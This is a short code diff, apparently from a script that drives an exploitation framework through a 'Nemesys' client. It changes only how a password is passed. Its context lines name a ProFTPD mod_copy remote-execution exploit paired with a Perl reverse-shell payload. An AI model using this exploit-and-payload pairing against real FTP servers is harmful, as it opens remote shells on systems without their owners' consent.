@@ -2,7 +2,7 @@ from nemesys.nemesys import Nemesys
 
 
 def main():
-    client = Nemesys("password")
+    client = Nemesys(password="password")
 
     exploit_name = "unix/ftp/proftpd_modcopy_exec"
     payload_name = "cmd/unix/reverse_perl"
